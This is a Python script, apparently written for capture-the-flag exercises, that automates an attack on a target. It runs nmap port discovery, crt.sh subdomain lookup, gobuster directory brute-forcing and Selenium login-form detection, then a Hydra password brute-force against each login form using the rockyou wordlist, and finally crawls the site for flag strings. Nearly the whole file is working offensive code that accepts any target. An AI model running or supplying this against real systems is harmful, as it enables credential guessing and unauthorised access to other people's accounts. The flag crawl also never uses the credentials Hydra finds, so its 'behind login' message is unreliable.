import subprocess
import sys
import os
import time
import re
from datetime import datetime
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import argparse

# ------------------ Args ------------------
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--gobuster", default="/usr/share/wordlists/dirb/common.txt", help="Gobuster wordlist path")
    parser.add_argument("--users", default="/usr/share/wordlists/usernames.txt", help="Hydra usernames list")
    parser.add_argument("--passwords", default="/usr/share/wordlists/rockyou.txt", help="Hydra passwords list")
    parser.add_argument("--failstr", default="invalid", help="Failure string shown on login failure (Hydra)")
    return parser.parse_args()

# ------------------ Utility ------------------
def run_command(cmd, output_file=None):
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(result)
        return result.decode()
    except subprocess.CalledProcessError as e:
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(e.output)
        return e.output.decode()

def make_dir(target):
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    dir_name = f"enum-{target.replace('.', '_')}-{timestamp}"
    os.makedirs(dir_name, exist_ok=True)
    return dir_name

# ------------------ Nmap Scan ------------------
def nmap_scan(target):
    print(f"[*] Running Nmap scan on {target} to find HTTP ports...")
    cmd = ['nmap', '-p-', '--open', '-sV', target]
    output = run_command(cmd)
    ports = []
    for line in output.splitlines():
        m = re.match(r'(\d+)/tcp\s+open\s+(\S+)', line)
        if m:
            port, service = m.groups()
            if 'http' in service.lower() or 'ssl' in service.lower():
                ports.append(int(port))
    if not ports:
        print("[-] No HTTP(S) ports found. Defaulting to port 80.")
        ports = [80]
    print(f"[+] Found HTTP ports: {ports}")
    return ports

# ------------------ Subdomain Enumeration ------------------
def subdomain_enum(domain, out_dir):
    print("[*] Running subdomain enumeration via crt.sh...")
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            subdomains = sorted({entry['name_value'] for entry in response.json()})
            with open(f"{out_dir}/subdomains.txt", "w") as f:
                for sub in subdomains:
                    f.write(sub + "\n")
            print(f"[+] Found {len(subdomains)} subdomains.")
        else:
            print("[-] crt.sh failed")
    except Exception as e:
        print(f"[-] Error during subdomain enumeration: {e}")

# ------------------ Gobuster Scan ------------------
def gobuster_scan(target, port, out_dir, wordlist):
    url = f"http://{target}:{port}"
    output = f"{out_dir}/gobuster_{port}.txt"
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-o", output, "-q"]
    print(f"[*] Running Gobuster on {url} ...")
    run_command(cmd)
    return output

# ------------------ Parse Gobuster ------------------
def find_login_like_paths(gobuster_file):
    login_keywords = ['login', 'signin', 'auth', 'admin', 'panel']
    found = []
    if not os.path.exists(gobuster_file):
        print(f"[-] Gobuster output file {gobuster_file} not found.")
        return found
    with open(gobuster_file, 'r') as f:
        for line in f:
            path = line.split()[0]
            if any(keyword in path.lower() for keyword in login_keywords):
                found.append(path)
    return found

# ------------------ Selenium Login Form Detection ------------------
def detect_login_forms(target, port, paths, out_dir):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Chrome(options=chrome_options)

    login_paths = []
    for path in paths:
        full_url = f"http://{target}:{port}{path}"
        print(f"[*] Checking {full_url} for login form...")
        try:
            driver.get(full_url)
            time.sleep(2)
            if driver.find_elements("css selector", 'input[type="password"]'):
                print(f"[+] Login form found at {path}")
                login_paths.append(path)
                screenshot_file = f"{out_dir}/login_{port}_{path.strip('/').replace('/', '_')}.png"
                driver.save_screenshot(screenshot_file)
        except Exception as e:
            print(f"[-] Error loading {full_url}: {e}")

    driver.quit()
    return login_paths

# ------------------ Hydra Brute Force ------------------
def run_hydra_login(target, port, login_path, users, passwords, fail_str, out_dir):
    print(f"[*] Running Hydra brute force on http://{target}:{port}{login_path} ...")
    hydra_cmd = [
        "hydra", "-L", users, "-P", passwords,
        f"{target}:{port}",
        "http-post-form",
        f"{login_path}:username=^USER^&password=^PASS^:F={fail_str}",
        "-o", f"{out_dir}/hydra_{port}_{login_path.strip('/').replace('/', '_')}.txt"
    ]
    subprocess.run(hydra_cmd)

# ------------------ Flag Hunting ------------------
def find_flags(driver, base_url):
    visited, flags = set(), set()
    to_visit = [base_url]

    while to_visit:
        url = to_visit.pop()
        if url in visited:
            continue
        visited.add(url)

        try:
            driver.get(url)
            time.sleep(1)
            source = driver.page_source
            found = re.findall(r"(flag\{.*?\}|CTF\{.*?\})", source, re.IGNORECASE)
            if found:
                print(f"[+] FLAG FOUND on {url}: {found}")
                flags.update(found)
            links = driver.find_elements("tag name", "a")
            for link in links:
                href = link.get_attribute("href")
                if href and href.startswith(base_url):
                    to_visit.append(href)
        except Exception as e:
            print(f"[-] Error visiting {url}: {e}")

    return flags

# ------------------ Main ------------------
def main():
    args = parse_args()
    target = args.target
    gobuster_wordlist = args.gobuster
    hydra_users = args.users
    hydra_passwords = args.passwords
    fail_string = args.failstr

    out_dir = make_dir(target)
    subdomain_enum(target, out_dir)
    http_ports = nmap_scan(target)

    for port in http_ports:
        gobuster_output = gobuster_scan(target, port, out_dir, gobuster_wordlist)
        login_paths = find_login_like_paths(gobuster_output)
        if not login_paths:
            print(f"[-] No login paths found on port {port}, skipping...")
            continue
        login_forms = detect_login_forms(target, port, login_paths, out_dir)
        if not login_forms:
            print(f"[-] No login forms confirmed on port {port}, skipping brute force...")
            continue

        for path in login_forms:
            run_hydra_login(target, port, path, hydra_users, hydra_passwords, fail_string, out_dir)

            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=chrome_options)

            base_url = f"http://{target}:{port}"
            flags = find_flags(driver, base_url)
            driver.quit()

            if flags:
                print("[🎉] Flags found:")
                for f in flags:
                    print(f)
            else:
                print("[-] No flags found behind login.")

    print("[+] Automation complete.")

if __name__ == "__main__":
    main()
